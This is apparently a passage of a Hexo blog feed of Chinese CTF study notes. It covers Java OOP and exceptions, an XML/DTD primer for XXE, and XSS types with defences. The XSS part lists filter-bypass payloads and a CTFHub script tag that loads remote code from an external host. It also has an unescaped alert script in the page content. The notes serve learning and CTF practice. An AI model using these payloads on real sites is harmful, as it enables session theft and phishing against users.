plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">//代码块（匿名代码块）创建对象时就生成，对象生成一次就加载一次</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static&#123;</span><br><span class="line">//静态代码块（匿名代码块）根类一块加载，就加载一次，永久存在</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">package com.oop.Demo07;</span><br><span class="line"></span><br><span class="line">public class demo01 &#123;</span><br><span class="line">    //2.赋初值</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(&quot;匿名代码块&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    //1只执行一次</span><br><span class="line">    static&#123;</span><br><span class="line">        System.out.println(&quot;静态代码块&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">//3.</span><br><span class="line">    public demo01() &#123;</span><br><span class="line">        System.out.println(&quot;构造方法&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] arga)&#123;</span><br><span class="line">        demo01 a1 = new demo01();</span><br><span class="line">        System.out.println(&quot;------&quot;);</span><br><span class="line">        demo01 a2 = new demo01();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230829200221714.png"></p><p>静态导入包  :  import static java.lang.Math.random;</p><h4 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h4><p>abstract修饰符可以用来修饰方法也可以修饰类,如果修饰方法,那么该方法就是抽象方法;如果修饰类,那么该类就是抽象类。<br>抽象类中可以没有抽象方法,但是有抽象方法的类一定要声明为抽象类。<br>抽象类,不能使用new关键字来创建对象,它是用来让子类继承的。抽象方法,只有方法的声明,没有方法的实现,它是用来让子类实现的。<br>子类继承抽象类,那么就必须要实现抽象类没有实现的抽象方法,否则该子类也要声明为抽象类。</p><p>抽象类：</p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230829202236686.png"></p><p>抽象类的所有方法，继承了他的子类，都必须实现要实现他的方法</p><p>抽象方法：只有方法的名字，没有方法的实现</p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230829202310818.png"></p><p>不能new抽象类，只能靠子类去实现他</p><p>抽象类可以卸载普通方法里</p><p>抽象方法必须在抽象类中</p><p>抽象的抽象：约束</p><h4 id="接口的定义与实现"><a href="#接口的定义与实现" class="headerlink" title="接口的定义与实现"></a>接口的定义与实现</h4><p>普通类:只有具体实现<br>抽象类:具体实现和规范(抽象方法)都有!</p><p>接口:只有规范!自己无法写方法  专业的约束 约束和实现的分离：面接口编程<br>接口就是规范，定义的是一组规则，体现了现实世界中“如果你是…则必须能…”的思想。如果你是天使，则必须能飞。如果你是汽车，则必须能跑。如果你好人，则必须干掉坏人;如果你是坏人，则必须欺负好人。</p><p><strong>接口的本质是契约</strong>，就像我们人间的法律一样。制定好后大家都遵守。<br>OO的精髓，是对对象的抽象，最能体现这一点的就是接口。为什么我们讨论设计模式都只针对具备了抽象能力的语言（比如c++、java、c#等)，就是因为设计模式所研究的，实际上就是如何合理的去抽象。<br>声明类的关键字是class,声明接口的关键字是interface</p><p>作用:</p><p>1．约束<br>2．定义一些方法，让不同的人实现~10—&gt;1</p><ol start="3"><li><p>public abstract</p></li><li><p>public static final<br>5。接口不能被实例化心，接口中没有构造方法<del>6. implements可以实现多个接口<br>7.必须要重写接口中的方法</del></p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.oop.demo09;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">public</span>  <span class="keyword">interface</span> <span class="title class_">Userservice</span>  &#123;</span><br><span class="line">    <span class="comment">//接口中所有的定义其实都是抽象的 public abstract</span></span><br><span class="line">     <span class="type">int</span> age=<span class="number">999</span>;</span><br><span class="line">     <span class="comment">//常量  public static final</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(String name)</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">delete</span><span class="params">(String name)</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">update</span><span class="params">(String name)</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">query</span><span class="params">(String name)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.oop.demo09;</span><br><span class="line"></span><br><span class="line"><span class="comment">//抽象类  extends</span></span><br><span class="line"><span class="comment">//类 可以实现接口 implements 接口</span></span><br><span class="line"><span class="comment">//实现了接口的类  就需要重写接口中的方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//利用接口实现多继承</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserserviceImpl</span> <span class="keyword">implements</span> <span class="title class_">Userservice</span>,Timeservice&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(String name)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delete</span><span class="params">(String name)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">(String name)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">query</span><span class="params">(String name)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">time</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.oop.demo09;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Timeservice</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">time</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h4><p>内部类就是在一个类的内部在定义一个类，比如，A类中定义一个B类，那么B类相对A类来说就称为内部类，而A类相对B类来说就是外部类了。<br>1.成员内部类<br>⒉静态内部类3.局部内部类4.匿名内部类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.oop.Demo010;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Outer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">out</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;这是外部类的方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span>  <span class="title class_">Inner</span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">in</span><span class="params">()</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;这是内部类的方法&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.oop;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.oop.Demo010.Outer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>   <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Outer</span> <span class="variable">outer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Outer</span>();</span><br><span class="line">        <span class="comment">//通过外部类来实现内部类</span></span><br><span class="line">        Outer.<span class="type">Inner</span> <span class="variable">inner</span> <span class="operator">=</span> outer.<span class="keyword">new</span> <span class="title class_">Inner</span>();</span><br><span class="line">        inner.in();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一个java类中可以有多个class类，但是只能有一个public class类</p><p>局部内部类</p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230831131531538.png"></p><h3 id="异常机制"><a href="#异常机制" class="headerlink" title="异常机制"></a>异常机制</h3><p>Error<br>Error类对象由Java虚拟机生成并抛出√大多数错误与代码编写者所执行的操作无关。<br>Java虚拟机运行错误(Virtual MachineError)，当JVM不再有继续执行操作所需的内存资源时，将出现OutOfMemoryError。这些异常发生时，Java虚拟机(JVM)一般会选择线程终止;<br>还有发生在虚拟机试图执行应用时，如类定义错误(NoClassDefFoundError)、链接错误(LinkageError)。这些错误是不可查的，因为它们在应用程序的控制和处理能力之外，而且绝大多数是程序运行时不允许出现的状况。</p><p>Exception一<br>在Exception分支中有一个重要的子类RuntimeException(运行时异常)<br>ArraylndexOutOfBoundsException(数组下标越界)—NullPointerException(空指针异常)<br>ArithmeticException(算术异常)<br>MissingResourceException(丢失资源)<br>ClassNotFoundException(找不到类)等异常，这些异常是不检查异常，程序中可以选择捕获处理，也可以不处理。<br>这些异常一般是由程序逻辑错误引起的，程序应该从逻辑角度尽可能避免这类异常的发生;<br>Error和Exception的区别: Error通常是灾难性的致命的错误，是程序无法控制和处理的，当出现这些异常时，Java虚拟机(JVM)一般会选择终止线程;Exception通常情况下是可以被程序处理时，开且仕程序甲应该尽可能的云处理这些异吊。</p><p>异常处理的两个机制：</p><p>抛出异常  捕获异常</p><p>异常处理的五个关键字</p><p>：try,catch,finally,throw,throws</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Expection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> a=<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> b=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            System.out.println(a/b);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(ArithmeticException e)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;程序出现异常，变量b不能为0&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;finally&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>try监控区域  catch 捕获环境  finally  处理善后工作</p><p>try  catch必须有，finally可以我没有</p><p>Ctrl+Alt+T自动包裹</p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230831152224452.png"></p><p>错误异常分类</p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230831154143492.png"></p><p>主动抛出异常</p><p><img src="/2023/08/24/java%E5%AD%A6%E4%B9%A0/AAwangzhan\blog2\themes\butterfly\source\img\image-20230831154326072.png"></p><p>一般在方法中使用，在这个方法中处理不了，可以主动抛出</p><p>####自定义异常</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Expection.demo02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="comment">//可能存在异常的的方法</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(<span class="type">int</span> a)</span> <span class="keyword">throws</span> myException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;传递的参数为&quot;</span>+a);</span><br><span class="line">        <span class="keyword">if</span>(a&gt;<span class="number">10</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">myException</span>(a);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;OK&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            test(<span class="number">111</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (myException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Myexception=》&quot;</span>+e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Xml实体注入漏洞</title>
      <link href="/2023/08/20/Xml%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/08/20/Xml%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>#Xml实体注入漏洞</p><p>##xml介绍</p><p>###什么是 XML?</p><ul><li>XML 指可扩展标记语言（<em>EX</em>tensible <em>M</em>arkup <em>L</em>anguage）</li><li>XML 是一种<em>标记语言</em>，很类似 HTML</li><li>XML 的设计宗旨是<em>传输数据</em>，而非显示数据</li><li>XML 标签没有被预定义。您需要<em>自行定义标签</em>。</li><li>XML 被设计为具有<em>自我描述性</em>。</li><li>XML 是 <em>W3C 的推荐标准</em></li></ul><p>###XML 与 HTML 的主要差异</p><p>XML 不是 HTML 的替代。</p><p>XML 和 HTML 为不同的目的而设计：</p><p>XML 被设计为传输和存储数据，其焦点是数据的内容。</p><p>HTML 被设计用来显示数据，其焦点是数据的外观。</p><p>HTML 旨在显示信息，而 XML 旨在传输信息。</p><h3 id="没有任何行为的-XML"><a href="#没有任何行为的-XML" class="headerlink" title="没有任何行为的 XML"></a>没有任何行为的 XML</h3><p><strong>XML 是不作为的。</strong></p><p>也许这有点难以理解，但是 XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。</p><p><strong>XML 被设计用来传输和存储数据。</strong></p><p><strong>HTML 被设计用来显示数据。</strong></p><p>###基本语法</p><blockquote><p>所有 XML 元素都须有关闭标签<br> XML 标签对大小写敏感<br> XML 文档必须有根元素<br> XML 的属性值须加引号</p></blockquote><h3 id="实体引用"><a href="#实体引用" class="headerlink" title="实体引用"></a>实体引用</h3><p><img src="/2023/08/20/Xml%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image/20200904173922834-1700990484762-303.png"></p><p>##DTD介绍</p><p><a href="https://www.w3school.com.cn/dtd/dtd_intro.asp">DTD介绍</a></p><p><strong>文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。</strong></p><p><strong>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</strong></p><p>内部的 DOCTYPE 声明</p><p>假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure><p>带有 DTD 的 XML 文档实例（请在 IE5 以及更高的版本打开，并选择查看源代码）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">  &lt;to&gt;George&lt;/to&gt;</span><br><span class="line">  &lt;from&gt;John&lt;/from&gt;</span><br><span class="line">  &lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">  &lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><p><em>!DOCTYPE note</em> (第二行)定义此文档是 <em>note</em> 类型的文档。</p><p><em>!ELEMENT note</em> (第三行)定义 <em>note</em> 元素有四个元素：”to、from、heading,、body”</p><p><em>!ELEMENT to</em> (第四行)定义 <em>to</em> 元素为 “#PCDATA” 类型</p><p><em>!ELEMENT from</em> (第五行)定义 <em>from</em> 元素为 “#PCDATA” 类型</p><p><em>!ELEMENT heading</em> (第六行)定义 <em>heading</em> 元素为 “#PCDATA” 类型</p><p><em>!ELEMENT body</em> (第七行)定义 <em>body</em> 元素为 “#PCDATA” 类型</p><p>###外部文档声明</p><p>假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure><p>这个 XML 文档和上面的 XML 文档相同，但是拥有一个外部的 DTD: （<a href="https://www.w3school.com.cn/dtd/note_ex_dtd.xml">在 IE5 中打开</a>，并选择“查看源代码”命令。）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt; </span><br></pre></td></tr></table></figure><p>这是包含 DTD 的 “note.dtd” 文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><p>附上实例：</p><pre><code>内部实体声明DTD 实例:&lt;!ENTITY writer &quot;Donald Duck.&quot;&gt; &lt;!ENTITY copyright &quot;Copyright runoob.com&quot;&gt;XML 实例：&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;外部实体声明DTD 实例:&lt;!ENTITY writer SYSTEM &quot;http://www.runoob.com/entities.dtd&quot;&gt; &lt;!ENTITY copyright SYSTEM &quot;http://www.runoob.com/entities.dtd&quot;&gt;XML 实例:&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</code></pre><p>一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号（;）</p><p>xxe主要是利用了DTD引用外部实体导致的漏洞</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>XSS跨站脚本注入攻击</title>
      <link href="/2023/08/17/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/"/>
      <url>/2023/08/17/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<p>#XSS跨站脚本注入攻击</p><p>跨站脚本(Cross-site Scripting )攻击，攻击者通过网站注入点注入客户端可执行解析的payload(脚本代码），当用户访问网页时，恶意payload自动加载并执行，以达到攻击者目的（窃取cookie、恶意传播、钓鱼欺骗等）。<br>为了避免与HTML语言中的CSS相混淆，通常称它为”XSS”。</p><p>XSS分为：存储型 、反射型 、DOM型XSS</p><p>###反射性XSS</p><p><img src="/2023/08/17/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/image/image-20230915195201845-1700990490828-305.png"></p><p>非持久化，仅执行一次，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面<br>DOM型XSS：不经过后端，DOM-XSS漏洞是基于文档对象模型(Document Objeet Model,DOM)的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。<br>攻击流程：攻击者-&gt;发现存在反射性XSS-&gt;根据输出点环境构造xss代码-&gt;进行代码缩短（可有可无，仅为了增加迷惑性）-&gt;发送给受害者-&gt;受害者点开链接，xss代码执行完成攻击者代码工具。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;hello,输入后会变成一级标题</span><br></pre></td></tr></table></figure><p><img src="/2023/08/17/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/image/image-20230916112206026-1700990490828-307.png"></p><p><img src="/2023/08/17/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/image/image-20230916112226123-1700990490828-306.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">过滤&lt;script&gt;,换为空</span><br><span class="line">&lt;sc&lt;script&gt;ript&gt;alert（1）&lt;/script&gt;</span><br><span class="line">换完之后为&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">匹配大小写</span><br><span class="line">&lt;Script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">对标签&lt;script&gt;进行过滤,可以用其他标签</span><br><span class="line">&lt;img src=1 onerror =alert(1)/&gt;</span><br><span class="line">防御：</span><br><span class="line">html转换字符</span><br><span class="line">$name=ntmlspecialchars($name)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ctfhub </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCRiPt sRC=//0x.ax/J5ddFe&gt;&lt;/sCrIpT&gt;</span><br></pre></td></tr></table></figure><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>特点：持久型</p><p>主要存在以攻击者将额恶意脚本存储到服务器的数据库中，当用户访问包含恶意相关数据的页面时，服务端未经严个过滤处理而输出在用户的浏览器中，导致浏览器执行代码数据</p><p>多见于评论留言框处</p><script>alert(1)</script>服务器将它存储于数据库中，每次访问都会进行弹窗，没次都是从数据库里查询这条语句，并且显示出来，<p>影响范围广，每个人访问这个网站都会从数据库提取信息</p><p>防御：</p><blockquote><p>trim(string[, charlist]):<br>函数移除字符串两侧的空白字符或预定义字符( \t. \n.\xOB、\r)stripslashes(string) :<br>移除字符串中的反斜杠<br>mysqli_real_escape_string(connection, string) :<br>对字符串中sql的特殊符号(ixoo , \n , lr , ,，”, x1a )进行转义<br>strip_tags(string, allow)函数剥去字符串中的HTML、XML以及 